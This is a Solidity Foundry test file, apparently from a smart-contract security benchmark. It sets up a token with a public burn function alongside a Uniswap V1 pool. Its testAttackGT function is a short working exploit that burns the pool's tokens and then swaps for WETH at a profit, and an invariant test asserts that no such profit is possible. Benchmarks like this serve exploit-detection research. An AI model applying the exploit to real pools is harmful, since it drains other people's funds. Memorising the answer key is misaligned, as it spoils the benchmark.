// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@utils/ERC20Basic.sol";
import "@utils/UniswapV1.sol";

import "benchmarks/TokenBurn/BurningToken.sol";
import "benchmarks/TokenBurn/Handler.sol";

contract TokenBurnTest is Test {
    address owner;
    address attacker;

    BurningToken token;
    WETH weth;
    UniswapV1 uniswap;
    TokenBurnHandler handler;

    uint256 public totalSupply = 1000 ether;
    uint256 public feeRate = 15;

    uint256 public attackerInitBalance = 0 ether;
    uint256 public attackerInitToken = 1 ether;

    uint256 public uniswapInitBalance = 10 ether;
    uint256 public uniswapInitToken = 10 ether;

    uint256 public requiredBalance = attackerInitToken;

    function setUp() public {
        owner = address(0xdeadbeef);
        attacker = address(this);

        vm.startPrank(owner);
        token = new BurningToken(totalSupply);
        weth = new WETH(totalSupply);
        uniswap = new UniswapV1(address(token), address(weth), feeRate);
        handler = new TokenBurnHandler(
            owner,
            attacker,
            address(token),
            address(weth),
            address(uniswap)
        );
        token.transfer(attacker, attackerInitToken);
        token.transfer(address(uniswap), uniswapInitToken);

        weth.transfer(attacker, attackerInitBalance);
        weth.transfer(address(uniswap), uniswapInitBalance);
        vm.stopPrank();

        excludeContract(address(token));
        excludeContract(address(weth));
        excludeContract(address(uniswap));

        token.approve(address(uniswap), UINT256_MAX);
        weth.approve(address(uniswap), UINT256_MAX);
    }

    function printBalance() internal {
        emit log_named_decimal_uint(
            "WETH Balance",
            weth.balanceOf(attacker),
            18
        );
        emit log_named_decimal_uint(
            "Token Balance",
            token.balanceOf(attacker),
            18
        );
    }

    function testAttackGT() public {
        token.burn(address(uniswap), token.balanceOf(address(uniswap)) - 1);
        uniswap.swapTokenToWETH(token.balanceOf(attacker));
        printBalance();
        require(weth.balanceOf(attacker) >= requiredBalance, "Attack Failed!");
    }

    function invariantNoProfit() public {
        assertLt(weth.balanceOf(attacker), requiredBalance);
    }
}
